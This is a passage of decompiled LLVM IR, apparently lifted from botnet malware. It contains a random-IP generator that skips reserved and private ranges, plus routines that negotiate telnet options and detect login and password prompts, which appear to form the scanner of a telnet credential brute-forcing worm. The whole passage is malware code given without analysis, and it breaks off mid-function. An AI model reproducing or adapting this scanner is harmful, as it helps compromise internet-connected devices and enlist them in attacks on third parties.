dec_label_pc_17b5c:                               ; preds = %dec_label_pc_17d20, %dec_label_pc_17d14, %dec_label_pc_17d08, %dec_label_pc_17cfc, %dec_label_pc_17cf0, %dec_label_pc_17ce4, %dec_label_pc_17cd8, %dec_label_pc_17ccc, %dec_label_pc_17cc0, %dec_label_pc_17cb4, %dec_label_pc_17ca8, %dec_label_pc_17c9c, %dec_label_pc_17c90, %dec_label_pc_17c84, %dec_label_pc_17c78, %dec_label_pc_17c54, %dec_label_pc_17c3c, %dec_label_pc_17c18, %dec_label_pc_17bf4, %dec_label_pc_17bdc, %dec_label_pc_17bd0, %dec_label_pc_17bc4, %dec_label_pc_17bb8, %dec_label_pc_17bac, %dec_label_pc_17ba0, %dec_label_pc_17b5c, %entry
  %v0_17b5c = call i32 @rand_next()
  %sext = mul i32 %v0_17b5c, 16777216
  %v1_17b60 = sdiv i32 %sext, 16777216
  %v1_17b6c = trunc i32 %v1_17b60 to i8
  %v3_17b74 = udiv i32 %v1_17b60, 256
  %v1_17b78 = trunc i32 %v3_17b74 to i8
  %v7_17b98 = icmp eq i8 %v1_17b6c, 127
  br i1 %v7_17b98, label %dec_label_pc_17b5c, label %dec_label_pc_17ba0

dec_label_pc_17ba0:                               ; preds = %dec_label_pc_17b5c
  %v2_17ba4 = icmp eq i8 %v1_17b6c, 0
  br i1 %v2_17ba4, label %dec_label_pc_17b5c, label %dec_label_pc_17bac

dec_label_pc_17bac:                               ; preds = %dec_label_pc_17ba0
  %v7_17bb0 = icmp eq i8 %v1_17b6c, 3
  br i1 %v7_17bb0, label %dec_label_pc_17b5c, label %dec_label_pc_17bb8

dec_label_pc_17bb8:                               ; preds = %dec_label_pc_17bac
  %v7_17bbc = icmp eq i8 %v1_17b6c, 15
  br i1 %v7_17bbc, label %dec_label_pc_17b5c, label %dec_label_pc_17bc4

dec_label_pc_17bc4:                               ; preds = %dec_label_pc_17bb8
  %v7_17bc8 = icmp eq i8 %v1_17b6c, 16
  br i1 %v7_17bc8, label %dec_label_pc_17b5c, label %dec_label_pc_17bd0

dec_label_pc_17bd0:                               ; preds = %dec_label_pc_17bc4
  %v7_17bd4 = icmp eq i8 %v1_17b6c, 56
  br i1 %v7_17bd4, label %dec_label_pc_17b5c, label %dec_label_pc_17bdc

dec_label_pc_17bdc:                               ; preds = %dec_label_pc_17bd0
  %v7_17be0 = icmp eq i8 %v1_17b6c, 10
  br i1 %v7_17be0, label %dec_label_pc_17b5c, label %dec_label_pc_17be8

dec_label_pc_17be8:                               ; preds = %dec_label_pc_17bdc
  %v7_17bec = icmp eq i8 %v1_17b6c, -64
  br i1 %v7_17bec, label %dec_label_pc_17bf4, label %dec_label_pc_17c00

dec_label_pc_17bf4:                               ; preds = %dec_label_pc_17be8
  %v7_17bf8 = icmp eq i8 %v1_17b78, -88
  br i1 %v7_17bf8, label %dec_label_pc_17b5c, label %dec_label_pc_17c00

dec_label_pc_17c00:                               ; preds = %dec_label_pc_17be8, %dec_label_pc_17bf4
  %v7_17c04 = icmp eq i8 %v1_17b6c, -84
  br i1 %v7_17c04, label %dec_label_pc_17c0c, label %dec_label_pc_17c24

dec_label_pc_17c0c:                               ; preds = %dec_label_pc_17c00
  %tmp = icmp ult i8 %v1_17b78, 16
  br i1 %tmp, label %dec_label_pc_17c24, label %dec_label_pc_17c18

dec_label_pc_17c18:                               ; preds = %dec_label_pc_17c0c
  %tmp11 = icmp ult i8 %v1_17b78, 32
  br i1 %tmp11, label %dec_label_pc_17b5c, label %dec_label_pc_17c24

dec_label_pc_17c24:                               ; preds = %dec_label_pc_17c00, %dec_label_pc_17c18, %dec_label_pc_17c0c
  %v7_17c28 = icmp eq i8 %v1_17b6c, 100
  br i1 %v7_17c28, label %dec_label_pc_17c30, label %dec_label_pc_17c48

dec_label_pc_17c30:                               ; preds = %dec_label_pc_17c24
  %tmp12 = icmp ult i8 %v1_17b78, 64
  br i1 %tmp12, label %dec_label_pc_17c48, label %dec_label_pc_17c3c

dec_label_pc_17c3c:                               ; preds = %dec_label_pc_17c30
  %tmp13 = icmp ult i8 %v1_17b78, 127
  br i1 %tmp13, label %dec_label_pc_17b5c, label %dec_label_pc_17c48

dec_label_pc_17c48:                               ; preds = %dec_label_pc_17c24, %dec_label_pc_17c3c, %dec_label_pc_17c30
  %v7_17c4c = icmp eq i8 %v1_17b6c, -87
  br i1 %v7_17c4c, label %dec_label_pc_17c54, label %dec_label_pc_17c60

dec_label_pc_17c54:                               ; preds = %dec_label_pc_17c48
  %v2_17c58 = icmp eq i8 %v1_17b78, -1
  br i1 %v2_17c58, label %dec_label_pc_17b5c, label %dec_label_pc_17c60

dec_label_pc_17c60:                               ; preds = %dec_label_pc_17c48, %dec_label_pc_17c54
  %v7_17c64 = icmp eq i8 %v1_17b6c, -58
  br i1 %v7_17c64, label %dec_label_pc_17c6c, label %dec_label_pc_17c84

dec_label_pc_17c6c:                               ; preds = %dec_label_pc_17c60
  %tmp14 = icmp ult i8 %v1_17b78, 18
  br i1 %tmp14, label %dec_label_pc_17c84, label %dec_label_pc_17c78

dec_label_pc_17c78:                               ; preds = %dec_label_pc_17c6c
  %tmp15 = or i8 %v1_17b78, 1
  %tmp16 = icmp eq i8 %tmp15, 19
  br i1 %tmp16, label %dec_label_pc_17b5c, label %dec_label_pc_17c84

dec_label_pc_17c84:                               ; preds = %dec_label_pc_17c60, %dec_label_pc_17c78, %dec_label_pc_17c6c
  %tmp17 = icmp ugt i8 %v1_17b6c, -33
  br i1 %tmp17, label %dec_label_pc_17b5c, label %dec_label_pc_17c90

dec_label_pc_17c90:                               ; preds = %dec_label_pc_17c84
  %v7_17c94 = icmp eq i8 %v1_17b6c, 6
  br i1 %v7_17c94, label %dec_label_pc_17b5c, label %dec_label_pc_17c9c

dec_label_pc_17c9c:                               ; preds = %dec_label_pc_17c90
  %v7_17ca0 = icmp eq i8 %v1_17b6c, 7
  br i1 %v7_17ca0, label %dec_label_pc_17b5c, label %dec_label_pc_17ca8

dec_label_pc_17ca8:                               ; preds = %dec_label_pc_17c9c
  %v7_17cac = icmp eq i8 %v1_17b6c, 11
  br i1 %v7_17cac, label %dec_label_pc_17b5c, label %dec_label_pc_17cb4

dec_label_pc_17cb4:                               ; preds = %dec_label_pc_17ca8
  %v7_17cb8 = icmp eq i8 %v1_17b6c, 21
  br i1 %v7_17cb8, label %dec_label_pc_17b5c, label %dec_label_pc_17cc0

dec_label_pc_17cc0:                               ; preds = %dec_label_pc_17cb4
  %v7_17cc4 = icmp eq i8 %v1_17b6c, 22
  br i1 %v7_17cc4, label %dec_label_pc_17b5c, label %dec_label_pc_17ccc

dec_label_pc_17ccc:                               ; preds = %dec_label_pc_17cc0
  %v7_17cd0 = icmp eq i8 %v1_17b6c, 26
  br i1 %v7_17cd0, label %dec_label_pc_17b5c, label %dec_label_pc_17cd8

dec_label_pc_17cd8:                               ; preds = %dec_label_pc_17ccc
  %v7_17cdc = icmp eq i8 %v1_17b6c, 28
  br i1 %v7_17cdc, label %dec_label_pc_17b5c, label %dec_label_pc_17ce4

dec_label_pc_17ce4:                               ; preds = %dec_label_pc_17cd8
  %v7_17ce8 = icmp eq i8 %v1_17b6c, 29
  br i1 %v7_17ce8, label %dec_label_pc_17b5c, label %dec_label_pc_17cf0

dec_label_pc_17cf0:                               ; preds = %dec_label_pc_17ce4
  %v7_17cf4 = icmp eq i8 %v1_17b6c, 30
  br i1 %v7_17cf4, label %dec_label_pc_17b5c, label %dec_label_pc_17cfc

dec_label_pc_17cfc:                               ; preds = %dec_label_pc_17cf0
  %v7_17d00 = icmp eq i8 %v1_17b6c, 33
  br i1 %v7_17d00, label %dec_label_pc_17b5c, label %dec_label_pc_17d08

dec_label_pc_17d08:                               ; preds = %dec_label_pc_17cfc
  %v7_17d0c = icmp eq i8 %v1_17b6c, 55
  br i1 %v7_17d0c, label %dec_label_pc_17b5c, label %dec_label_pc_17d14

dec_label_pc_17d14:                               ; preds = %dec_label_pc_17d08
  %v7_17d18 = icmp eq i8 %v1_17b6c, -42
  br i1 %v7_17d18, label %dec_label_pc_17b5c, label %dec_label_pc_17d20

dec_label_pc_17d20:                               ; preds = %dec_label_pc_17d14
  %v7_17d24 = icmp eq i8 %v1_17b6c, -41
  br i1 %v7_17d24, label %dec_label_pc_17b5c, label %dec_label_pc_17d2c

dec_label_pc_17d2c:                               ; preds = %dec_label_pc_17d20
  %v2_17d50 = call i32 @llvm.bswap.i32(i32 %v1_17b60)
  %v1_17d58 = call i32 @__GI_htonl(i32 %v2_17d50)
  ret i32 %v1_17d58

; uselistorder directives
  uselistorder i8 %v1_17b78, { 4, 5, 6, 2, 3, 0, 1, 7 }
  uselistorder i8 %v1_17b6c, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %v1_17b60, { 2, 0, 1 }
  uselistorder i8 -64, { 1, 0 }
  uselistorder label %dec_label_pc_17c84, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17c60, { 1, 0 }
  uselistorder label %dec_label_pc_17c48, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17c24, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17c00, { 1, 0 }
}

define i32 @consume_iacs(i32 %conn) local_unnamed_addr {
entry:
  %tmp2_-44 = alloca [9 x i8], align 4
  %tmp2_-40 = alloca [9 x i8], align 1
  %tmp1_-31 = alloca [3 x i8], align 1
  %v3_17d74 = load i32, i32* @fp, align 4
  %v4_17d80 = bitcast [9 x i8]* %tmp2_-44 to i32*
  store i32 %conn, i32* %v4_17d80, align 4
  %v1_17d90 = add i32 %conn, 28
  %v2_17e20 = ptrtoint [3 x i8]* %tmp1_-31 to i32
  %v2_17e3c = ptrtoint [9 x i8]* %tmp2_-40 to i32
  br label %dec_label_pc_17fc0.outer

dec_label_pc_17d9c:                               ; preds = %dec_label_pc_17fc0
  %v2_17da0 = load i8, i8* %v1_17da0, align 1
  %v2_17da4 = icmp eq i8 %v2_17da0, -1
  br i1 %v2_17da4, label %dec_label_pc_17dac, label %dec_label_pc_17fd4

dec_label_pc_17dac:                               ; preds = %dec_label_pc_17d9c
  %v2_17db0 = load i8, i8* %v1_17da0, align 1
  %v2_17db4 = icmp eq i8 %v2_17db0, -1
  br i1 %v2_17db4, label %dec_label_pc_17dbc, label %dec_label_pc_17fc0

dec_label_pc_17dbc:                               ; preds = %dec_label_pc_17dac
  %v5_17dc8 = call i8 @can_consume(i32 %v4_17ebc, i8* nonnull %v1_17da0, i32 1)
  %v2_17dd0 = icmp eq i8 %v5_17dc8, 0
  br i1 %v2_17dd0, label %dec_label_pc_17fd4, label %dec_label_pc_17dd8

dec_label_pc_17dd8:                               ; preds = %dec_label_pc_17dbc
  %v1_17ddc = add i32 %i_-24.0.ph, 1
  %v1_17de0 = inttoptr i32 %v1_17ddc to i8*
  %v2_17de0 = load i8, i8* %v1_17de0, align 1
  %v2_17de4 = icmp eq i8 %v2_17de0, -1
  br i1 %v2_17de4, label %dec_label_pc_17dec, label %dec_label_pc_17e08

dec_label_pc_17dec:                               ; preds = %dec_label_pc_17dd8
  %v1_17df0 = add i32 %i_-24.0.ph, 2
  %v1_17dfc = add i32 %v4_17fc8, 2
  br label %dec_label_pc_17fc0.outer.backedge

dec_label_pc_17fc0.outer.backedge:                ; preds = %dec_label_pc_17dec, %dec_label_pc_17e84, %dec_label_pc_17f8c
  %v4_17fc09 = phi i32 [ %v4_17f8c, %dec_label_pc_17f8c ], [ %v4_17ebc, %dec_label_pc_17e84 ], [ %v4_17ebc, %dec_label_pc_17dec ]
  %ptr_-28.0.ph.be.in = phi i32 [ %v1_17fb8, %dec_label_pc_17f8c ], [ %v1_17e94, %dec_label_pc_17e84 ], [ %v1_17dfc, %dec_label_pc_17dec ]
  %i_-24.0.ph.be = phi i32 [ %v1_17fac, %dec_label_pc_17f8c ], [ %v1_17e88, %dec_label_pc_17e84 ], [ %v1_17df0, %dec_label_pc_17dec ]
  %ptr_-28.0.ph.be = inttoptr i32 %ptr_-28.0.ph.be.in to i8*
  br label %dec_label_pc_17fc0.outer

dec_label_pc_17e08:                               ; preds = %dec_label_pc_17dd8
  %v2_17e10 = load i8, i8* %v1_17de0, align 1
  %v7_17e14 = icmp eq i8 %v2_17e10, -3
  br i1 %v7_17e14, label %dec_label_pc_17e1c, label %dec_label_pc_17ee0

dec_label_pc_17e1c:                               ; preds = %dec_label_pc_17e08
  store i32 ptrtoint (i32* @global_var_23080.293 to i32), i32* @r3, align 4
  store i32 3, i32* @ip, align 4
  store i32 %v2_17e20, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23080.293 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  %v0_17e34 = call i32 @memcpy()
  store i32 ptrtoint (i32* @global_var_23077.295 to i32), i32* @r3, align 4
  store i32 9, i32* @ip, align 4
  store i32 %v2_17e3c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23077.295 to i32), i32* @r1, align 4
  store i32 9, i32* @r2, align 4
  %v0_17e50 = call i32 @memcpy()
  %v5_17e60 = call i8 @can_consume(i32 %v4_17ebc, i8* nonnull %v1_17da0, i32 2)
  %v2_17e68 = icmp eq i8 %v5_17e60, 0
  br i1 %v2_17e68, label %dec_label_pc_17fd4, label %dec_label_pc_17e70

dec_label_pc_17e70:                               ; preds = %dec_label_pc_17e1c
  %v1_17e74 = add i32 %i_-24.0.ph, 2
  %v1_17e78 = inttoptr i32 %v1_17e74 to i8*
  %v2_17e78 = load i8, i8* %v1_17e78, align 1
  %v7_17e7c = icmp eq i8 %v2_17e78, 31
  br i1 %v7_17e7c, label %dec_label_pc_17e84, label %dec_label_pc_17ee0

dec_label_pc_17e84:                               ; preds = %dec_label_pc_17e70
  %v1_17e88 = add i32 %i_-24.0.ph, 3
  %v1_17e94 = add i32 %v4_17fc8, 3
  %v1_17ea0 = add i32 %v4_17ebc, 4
  %v2_17ea0 = inttoptr i32 %v1_17ea0 to i32*
  %v3_17ea0 = load i32, i32* %v2_17ea0, align 4
  %v5_17eb8 = call i32 @__libc_send(i32 %v3_17ea0, i32 %v2_17e20, i32 3, i32 16384)
  %v3_17ec0 = load i32, i32* %v2_17ea0, align 4
  %v4_17ed8 = call i32 @__libc_send(i32 %v3_17ec0, i32 %v2_17e3c, i32 9, i32 16384)
  br label %dec_label_pc_17fc0.outer.backedge

dec_label_pc_17ee0:                               ; preds = %dec_label_pc_17e70, %dec_label_pc_17e08
  %v5_17eec = call i8 @can_consume(i32 %v4_17ebc, i8* nonnull %v1_17da0, i32 2)
  %v2_17ef4 = icmp eq i8 %v5_17eec, 0
  br i1 %v2_17ef4, label %dec_label_pc_17fd4, label %dec_label_pc_17f80.preheader

dec_label_pc_17f80.preheader:                     ; preds = %dec_label_pc_17ee0
  br label %dec_label_pc_17f08

dec_label_pc_17f08:                               ; preds = %dec_label_pc_17f80.preheader, %dec_label_pc_17f74
  %storemerge15 = phi i32 [ 0, %dec_label_pc_17f80.preheader ], [ %v1_17f78, %dec_label_pc_17f74 ]
  %v2_17f14 = add i32 %storemerge15, %i_-24.0.ph
  %v1_17f18 = inttoptr i32 %v2_17f14 to i8*
  %v2_17f18 = load i8, i8* %v1_17f18, align 1
  %v7_17f1c = icmp eq i8 %v2_17f18, -3
  br i1 %v7_17f1c, label %dec_label_pc_17f24, label %dec_label_pc_17f40

dec_label_pc_17f24:                               ; preds = %dec_label_pc_17f08
  store i8 -4, i8* %v1_17f18, align 1
  br label %dec_label_pc_17f74

dec_label_pc_17f40:                               ; preds = %dec_label_pc_17f08
  %v2_17f50 = load i8, i8* %v1_17f18, align 1
  %v7_17f54 = icmp eq i8 %v2_17f50, -5
  br i1 %v7_17f54, label %dec_label_pc_17f5c, label %dec_label_pc_17f74

dec_label_pc_17f5c:                               ; preds = %dec_label_pc_17f40
  store i8 -3, i8* %v1_17f18, align 1
  br label %dec_label_pc_17f74

dec_label_pc_17f74:                               ; preds = %dec_label_pc_17f40, %dec_label_pc_17f24, %dec_label_pc_17f5c
  %v1_17f78 = add nuw nsw i32 %storemerge15, 1
  %v7_17f88 = icmp slt i32 %v1_17f78, 3
  br i1 %v7_17f88, label %dec_label_pc_17f08, label %dec_label_pc_17f8c

dec_label_pc_17f8c:                               ; preds = %dec_label_pc_17f74
  %v4_17f8c = load i32, i32* %v4_17d80, align 4
  %v1_17f90 = add i32 %v4_17f8c, 4
  %v2_17f90 = inttoptr i32 %v1_17f90 to i32*
  %v3_17f90 = load i32, i32* %v2_17f90, align 4
  %v4_17fa4 = call i32 @__libc_send(i32 %v3_17f90, i32 %i_-24.0.ph, i32 3, i32 16384)
  %v1_17fac = add i32 %i_-24.0.ph, 3
  %v1_17fb8 = add i32 %v4_17fc8, 3
  br label %dec_label_pc_17fc0.outer.backedge

dec_label_pc_17fc0.outer:                         ; preds = %dec_label_pc_17fc0.outer.backedge, %entry
  %v4_17ebc = phi i32 [ %conn, %entry ], [ %v4_17fc09, %dec_label_pc_17fc0.outer.backedge ]
  %ptr_-28.0.ph = phi i8* [ null, %entry ], [ %ptr_-28.0.ph.be, %dec_label_pc_17fc0.outer.backedge ]
  %i_-24.0.ph = phi i32 [ %v1_17d90, %entry ], [ %i_-24.0.ph.be, %dec_label_pc_17fc0.outer.backedge ]
  %v4_17fc8 = ptrtoint i8* %ptr_-28.0.ph to i32
  %v1_17da0 = inttoptr i32 %i_-24.0.ph to i8*
  %v1_17fc4 = add i32 %v4_17ebc, 24
  %v2_17fc4 = inttoptr i32 %v1_17fc4 to i32*
  br label %dec_label_pc_17fc0

dec_label_pc_17fc0:                               ; preds = %dec_label_pc_17fc0.outer, %dec_label_pc_17dac
  %v3_17fc4 = load i32, i32* %v2_17fc4, align 4
  %v8_17fd0 = icmp sgt i32 %v3_17fc4, %v4_17fc8
  br i1 %v8_17fd0, label %dec_label_pc_17d9c, label %dec_label_pc_17fd4

dec_label_pc_17fd4:                               ; preds = %dec_label_pc_17ee0, %dec_label_pc_17e1c, %dec_label_pc_17dbc, %dec_label_pc_17d9c, %dec_label_pc_17fc0
  store i32 %v3_17d74, i32* @fp, align 4
  ret i32 %v4_17fc8

; uselistorder directives
  uselistorder i8* %v1_17da0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_17fc8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %i_-24.0.ph, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 %v4_17ebc, { 0, 5, 1, 6, 4, 2, 3 }
  uselistorder i32 %v4_17f8c, { 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i8 (i32, i8*, i32)* @can_consume, { 2, 1, 0 }
  uselistorder i32 %conn, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17fd4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_17f74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17f08, { 1, 0 }
  uselistorder label %dec_label_pc_17fc0.outer.backedge, { 2, 1, 0 }
}

define i32 @consume_any_prompt(i32 %conn) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_17ff0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_17ff0, i32* @ip, align 4
  %v1_18010 = add i32 %conn, 24
  %v2_18010 = inttoptr i32 %v1_18010 to i32*
  %v3_18010 = load i32, i32* %v2_18010, align 4
  br label %dec_label_pc_180dc

dec_label_pc_18020:                               ; preds = %dec_label_pc_180dc
  %v2_1802c = add i32 %v1_18014, %conn
  %v1_18034 = add i32 %v2_1802c, 28
  %v2_18034 = inttoptr i32 %v1_18034 to i8*
  %v3_18034 = load i8, i8* %v2_18034, align 1
  %v7_18038 = icmp eq i8 %v3_18034, 58
  br i1 %v7_18038, label %dec_label_pc_180c0, label %dec_label_pc_18040

dec_label_pc_18040:                               ; preds = %dec_label_pc_18020
  %v3_18054 = load i8, i8* %v2_18034, align 1
  %v7_18058 = icmp eq i8 %v3_18054, 62
  br i1 %v7_18058, label %dec_label_pc_180c0, label %dec_label_pc_18060

dec_label_pc_18060:                               ; preds = %dec_label_pc_18040
  %v3_18074 = load i8, i8* %v2_18034, align 1
  %v7_18078 = icmp eq i8 %v3_18074, 36
  br i1 %v7_18078, label %dec_label_pc_180c0, label %dec_label_pc_18080

dec_label_pc_18080:                               ; preds = %dec_label_pc_18060
  %v3_18094 = load i8, i8* %v2_18034, align 1
  %v7_18098 = icmp eq i8 %v3_18094, 35
  br i1 %v7_18098, label %dec_label_pc_180c0, label %dec_label_pc_180a0

dec_label_pc_180a0:                               ; preds = %dec_label_pc_18080
  %v3_180b4 = load i8, i8* %v2_18034, align 1
  %v7_180b8 = icmp eq i8 %v3_180b4, 37
  br i1 %v7_180b8, label %dec_label_pc_180c0, label %dec_label_pc_180dc

dec_label_pc_180c0:                               ; preds = %dec_label_pc_180a0, %dec_label_pc_18080, %dec_label_pc_18060, %dec_label_pc_18040, %dec_label_pc_18020
  br label %dec_label_pc_180e8

dec_label_pc_180dc:                               ; preds = %dec_label_pc_180a0, %entry
  %v3_18010.sink = phi i32 [ %v3_18010, %entry ], [ %v1_18014, %dec_label_pc_180a0 ]
  %v1_18014 = add i32 %v3_18010.sink, -1
  %v5_180e4 = icmp sgt i32 %v1_18014, 0
  br i1 %v5_180e4, label %dec_label_pc_18020, label %dec_label_pc_180e8

dec_label_pc_180e8:                               ; preds = %dec_label_pc_180dc, %dec_label_pc_180c0
  %prompt_ending_-20.0 = phi i32 [ %v3_18010.sink, %dec_label_pc_180c0 ], [ -1, %dec_label_pc_180dc ]
  %v3_180ec = icmp eq i32 %prompt_ending_-20.0, -1
  %storemerge3 = select i1 %v3_180ec, i32 0, i32 %prompt_ending_-20.0
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v1_18014, { 2, 0, 1 }
}

define i32 @consume_user_prompt(i32 %conn) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_1811c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_1811c, i32* @ip, align 4
  %v3_18120 = load i32, i32* @fp, align 4
  %v1_1813c = add i32 %conn, 24
  %v2_1813c = inttoptr i32 %v1_1813c to i32*
  %v3_1813c = load i32, i32* %v2_1813c, align 4
  br label %dec_label_pc_18208

dec_label_pc_1814c:                               ; preds = %dec_label_pc_18208
  %v2_18158 = add i32 %v1_18140, %conn
  %v1_18160 = add i32 %v2_18158, 28
  %v2_18160 = inttoptr i32 %v1_18160 to i8*
  %v3_18160 = load i8, i8* %v2_18160, align 1
  %v7_18164 = icmp eq i8 %v3_18160, 58
  br i1 %v7_18164, label %dec_label_pc_181ec, label %dec_label_pc_1816c

dec_label_pc_1816c:                               ; preds = %dec_label_pc_1814c
  %v3_18180 = load i8, i8* %v2_18160, align 1
  %v7_18184 = icmp eq i8 %v3_18180, 62
  br i1 %v7_18184, label %dec_label_pc_181ec, label %dec_label_pc_1818c

dec_label_pc_1818c:                               ; preds = %dec_label_pc_1816c
  %v3_181a0 = load i8, i8* %v2_18160, align 1
  %v7_181a4 = icmp eq i8 %v3_181a0, 36
  br i1 %v7_181a4, label %dec_label_pc_181ec, label %dec_label_pc_181ac

dec_label_pc_181ac:                               ; preds = %dec_label_pc_1818c
  %v3_181c0 = load i8, i8* %v2_18160, align 1
  %v7_181c4 = icmp eq i8 %v3_181c0, 35
  br i1 %v7_181c4, label %dec_label_pc_181ec, label %dec_label_pc_181cc

dec_label_pc_181cc:                               ; preds = %dec_label_pc_181ac
  %v3_181e0 = load i8, i8* %v2_18160, align 1
  %v7_181e4 = icmp eq i8 %v3_181e0, 37
  br i1 %v7_181e4, label %dec_label_pc_181ec, label %dec_label_pc_18208

dec_label_pc_181ec:                               ; preds = %dec_label_pc_181cc, %dec_label_pc_181ac, %dec_label_pc_1818c, %dec_label_pc_1816c, %dec_label_pc_1814c
  br label %dec_label_pc_18214

dec_label_pc_18208:                               ; preds = %dec_label_pc_181cc, %entry
  %v3_1813c.sink = phi i32 [ %v3_1813c, %entry ], [ %v1_18140, %dec_label_pc_181cc ]
  %v1_18140 = add i32 %v3_1813c.sink, -1
  %v5_18210 = icmp sgt i32 %v1_18140, 0
  br i1 %v5_18210, label %dec_label_pc_1814c, label %dec_label_pc_18214

dec_label_pc_18214:                               ; preds = %dec_label_pc_18208, %dec_label_pc_181ec
  %tmp_-24.0 = phi i32 [ %v3_1813c.sink, %dec_label_pc_181ec ], [ -1, %dec_label_pc_18208 ]
  %v3_18218 = icmp eq i32 %tmp_-24.0, -1
  br i1 %v3_18218, label %dec_label_pc_18220, label %dec_label_pc_182a4

dec_label_pc_18220:                               ; preds = %dec_label_pc_18214
  %v1_18224 = add i32 %conn, 28
  %v3_1822c = load i32, i32* %v2_1813c, align 4
  %v1_18230 = inttoptr i32 %v1_18224 to i8*
  %v8_18240 = call i32 @util_memsearch(i8* %v1_18230, i32 %v3_1822c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_23084.297, i32 0, i32 0), i32 4)
  %v7_18250 = icmp eq i32 %v8_18240, -1
  br i1 %v7_18250, label %dec_label_pc_18264, label %dec_label_pc_18258

dec_label_pc_18258:                               ; preds = %dec_label_pc_18220
  br label %dec_label_pc_182a4

dec_label_pc_18264:                               ; preds = %dec_label_pc_18220
  %v3_18270 = load i32, i32* %v2_1813c, align 4
  %v9_18284 = call i32 @util_memsearch(i8* %v1_18230, i32 %v3_18270, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2308c.299, i32 0, i32 0), i32 5)
  %v7_18294 = icmp eq i32 %v9_18284, -1
  br i1 %v7_18294, label %dec_label_pc_182a4, label %dec_label_pc_1829c

dec_label_pc_1829c:                               ; preds = %dec_label_pc_18264
  br label %dec_label_pc_182a4

dec_label_pc_182a4:                               ; preds = %dec_label_pc_18214, %dec_label_pc_18264, %dec_label_pc_18258, %dec_label_pc_1829c
  %tmp_-24.1 = phi i32 [ -1, %dec_label_pc_18264 ], [ %v9_18284, %dec_label_pc_1829c ], [ %v8_18240, %dec_label_pc_18258 ], [ %tmp_-24.0, %dec_label_pc_18214 ]
  %v3_182a8 = icmp eq i32 %tmp_-24.1, -1
  %storemerge3 = select i1 %v3_182a8, i32 0, i32 %tmp_-24.1
  store i32 %v3_18120, i32* @fp, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v9_18284, { 1, 0 }
  uselistorder i32 %v8_18240, { 1, 0 }
  uselistorder i32 %v1_18140, { 2, 0, 1 }
  uselistorder i32 %conn, { 1, 0, 2 }
  uselistorder label %dec_label_pc_182a4, { 3, 1, 2, 0 }
}

define i32 @consume_pass_prompt(i32 %conn) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_182e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_182e0, i32* @ip, align 4
  %v3_182e4 = load i32, i32* @fp, align 4
  %v1_18300 = add i32 %conn, 24
  %v2_18300 = inttoptr i32 %v1_18300 to i32*
  %v3_18300 = load i32, i32* %v2_18300, align 4
  br label %dec_label_pc_183ac

dec_label_pc_18310:                               ; preds = %dec_label_pc_183ac
  %v2_1831c = add i32 %v1_18304, %conn
  %v1_18324 = add i32 %v2_1831c, 28
  %v2_18324 = inttoptr i32 %v1_18324 to i8*
  %v3_18324 = load i8, i8* %v2_18324, align 1
  %v7_18328 = icmp eq i8 %v3_18324, 58
  br i1 %v7_18328, label %dec_label_pc_18390, label %dec_label_pc_18330

dec_label_pc_18330:                               ; preds = %dec_label_pc_18310
  %v3_18344 = load i8, i8* %v2_18324, align 1
  %v7_18348 = icmp eq i8 %v3_18344, 62
  br i1 %v7_18348, label %dec_label_pc_18390, label %dec_label_pc_18350

dec_label_pc_18350:                               ; preds = %dec_label_pc_18330
  %v3_18364 = load i8, i8* %v2_18324, align 1
  %v7_18368 = icmp eq i8 %v3_18364, 36
  br i1 %v7_18368, label %dec_label_pc_18390, label %dec_label_pc_18370

dec_label_pc_18370:                               ; preds = %dec_label_pc_18350
  %v3_18384 = load i8, i8* %v2_18324, align 1
  %v7_18388 = icmp eq i8 %v3_18384, 35
  br i1 %v7_18388, label %dec_label_pc_18390, label %dec_label_pc_183ac

dec_label_pc_18390:                               ; preds = %dec_label_pc_18370, %dec_label_pc_18350, %dec_label_pc_18330, %dec_label_pc_18310
  br label %dec_label_pc_183b8

dec_label_pc_183ac:                               ; preds = %dec_label_pc_18370, %entry
  %v3_18300.sink = phi i32 [ %v3_18300, %entry ], [ %v1_18304, %dec_label_pc_18370 ]
  %v1_18304 = add i32 %v3_18300.sink, -1
  %v5_183b4 = icmp sgt i32 %v1_18304, 0
  br i1 %v5_183b4, label %dec_label_pc_18310, label %dec_label_pc_183b8

dec_label_pc_183b8:                               ; preds = %dec_label_pc_183ac, %dec_label_pc_18390
  %tmp_-24.0 = phi i32 [ %v3_18300.sink, %dec_label_pc_18390 ], [ -1, %dec_label_pc_183ac ]
  %v3_183bc = icmp eq i32 %tmp_-24.0, -1
  br i1 %v3_183bc, label %dec_label_pc_183c4, label %dec_label_pc_18404

dec_label_pc_183c4:                               ; preds = %dec_label_pc_183b8
  %v1_183c8 = add i32 %conn, 28
  %v3_183d0 = load i32, i32* %v2_18300, align 4
  %v1_183d4 = inttoptr i32 %v1_183c8 to i8*
  %v8_183e4 = call i32 @util_memsearch(i8* %v1_183d4, i32 %v3_183d0, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23094.301, i32 0, i32 0), i32 7)
  %v7_183f4 = icmp eq i32 %v8_183e4, -1
  br i1 %v7_183f4, label %dec_label_pc_18404, label %dec_label_pc_183fc

